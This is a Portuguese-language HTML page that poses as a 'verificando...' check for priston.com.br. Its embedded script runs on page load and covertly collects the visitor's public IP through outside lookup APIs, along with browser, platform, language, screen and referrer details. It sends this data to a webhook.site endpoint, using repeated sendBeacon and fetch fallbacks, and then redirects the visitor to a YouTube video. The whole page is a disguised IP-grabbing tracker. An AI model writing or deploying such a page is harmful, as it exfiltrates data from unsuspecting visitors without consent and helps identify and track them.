<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="refresh" content="2;url=https://priston.com.br">
  <title>priston.com.br</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background: #000000;
      color: white;
    }
    .container {
      text-align: center;
    }
    .spinner {
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top: 4px solid white;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <p>verificando...</p>
  </div>
  <script>
    // URL do seu webhook (ex.: Webhook.site, Formspree, Zapier/Make)
    // Substitua a string abaixo pela sua URL real
    const WEBHOOK_URL = 'https://webhook.site/5aa3ae90-dcb7-4538-a064-ed727ea8b711';
    let payloadSent = false;

    // Envia dados para o webhook com múltiplas estratégias para mobile
    function sendToWebhook(payload) {
      if (payloadSent || !WEBHOOK_URL) return; // Evita múltiplos envios ou se não houver URL
      
      const clientIP = payload.ip || 'unknown';
      
      try {
        // Estratégia 1: sendBeacon com FormData (evita preflight CORS OPTIONS)
        // Como sendBeacon não permite headers, adiciona IP no query string
        if (navigator.sendBeacon) {
          const formData = new FormData();
          formData.append('data', JSON.stringify(payload));
          const urlWithIP = `${WEBHOOK_URL}?client_ip=${encodeURIComponent(clientIP)}`;
          const ok = navigator.sendBeacon(urlWithIP, formData);
          if (ok) {
            payloadSent = true;
            return;
          }
        }
        
        // Estratégia 2: sendBeacon com texto plano (também evita preflight)
        // IP no query string também
        if (navigator.sendBeacon && !payloadSent) {
          const blob = new Blob([JSON.stringify(payload)], { type: 'text/plain' });
          const urlWithIP = `${WEBHOOK_URL}?client_ip=${encodeURIComponent(clientIP)}`;
          const ok = navigator.sendBeacon(urlWithIP, blob);
          if (ok) {
            payloadSent = true;
            return;
          }
        }
        
        // Estratégia 3: fetch com FormData, keepalive e header com IP
        if (!payloadSent) {
          const formData = new FormData();
          formData.append('data', JSON.stringify(payload));
          fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
              'X-Client-IP': clientIP
            },
            body: formData,
            keepalive: true // Crítico para funcionar durante navegação
          }).then(() => {
            payloadSent = true;
          }).catch(() => {
            // Se fetch falhar, última tentativa com texto plano e query string
            if (navigator.sendBeacon && !payloadSent) {
              const blob = new Blob([JSON.stringify(payload)], { type: 'text/plain' });
              const urlWithIP = `${WEBHOOK_URL}?client_ip=${encodeURIComponent(clientIP)}`;
              navigator.sendBeacon(urlWithIP, blob);
            }
          });
        }
      } catch (e) {
        // Última tentativa com sendBeacon e texto plano
        try {
          if (navigator.sendBeacon && !payloadSent) {
            const blob = new Blob([JSON.stringify(payload)], { type: 'text/plain' });
            const urlWithIP = `${WEBHOOK_URL}?client_ip=${encodeURIComponent(clientIP)}`;
            navigator.sendBeacon(urlWithIP, blob);
          }
        } catch (_) {}
      }
    }

    // Captura IP usando múltiplas APIs públicas, tentando até obter um IP
    async function captureIPAndSend() {
      const apis = [
        'https://api.ipify.org?format=json',
        'https://api.myip.com',
        'https://ipapi.co/json/'
      ];

      let capturedIP = null;
      
      // Tenta capturar IP com timeout de 2 segundos
      const ipPromise = Promise.race([
        (async () => {
          for (const apiUrl of apis) {
            try {
              const response = await fetch(apiUrl, { 
                cache: 'no-store',
                signal: AbortSignal.timeout(1500) // timeout de 1.5s por API
              });
              const data = await response.json();
              const ip = data.ip || data.query || data.ip_address;
              if (ip) {
                return ip;
              }
            } catch (_) {
              // tenta próxima API
            }
          }
          return null;
        })(),
        new Promise(resolve => setTimeout(() => resolve(null), 2000))
      ]);

      capturedIP = await ipPromise;

      const payload = {
        ip: capturedIP || 'unknown',
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        referer: document.referrer || 'Acesso direto',
        url: window.location.href,
        language: navigator.language || 'unknown',
        platform: navigator.platform || 'unknown',
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
      };

      // Envia o payload
      sendToWebhook(payload);
    }

    // Envia o payload imediatamente quando a página carrega
    captureIPAndSend();
    
    // Fallback: envia quando a página perde visibilidade (mobile especialmente)
    window.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'hidden' && !payloadSent) {
        sendToWebhook({
          ip: 'unknown',
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          referer: document.referrer || 'Acesso direto',
          url: window.location.href,
          language: navigator.language || 'unknown',
          platform: navigator.platform || 'unknown',
          screenWidth: window.screen.width,
          screenHeight: window.screen.height,
          isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
          fallback: true
        });
      }
    });

    // Fallback adicional: envia antes de sair da página
    window.addEventListener('beforeunload', () => {
      if (!payloadSent) {
        sendToWebhook({
          ip: 'unknown',
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          referer: document.referrer || 'Acesso direto',
          url: window.location.href,
          language: navigator.language || 'unknown',
          platform: navigator.platform || 'unknown',
          screenWidth: window.screen.width,
          screenHeight: window.screen.height,
          isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
          beforeunload: true
        });
      }
    });

    // Redireciona após garantir que o payload foi enviado (aumentado para 2.5s)
    setTimeout(() => {
      window.location.href = 'https://youtu.be/THg6JU2Vnl4?si=ZUxE2NOGF4urvL2h';
    }, 2500);
  </script>
</body>
</html>
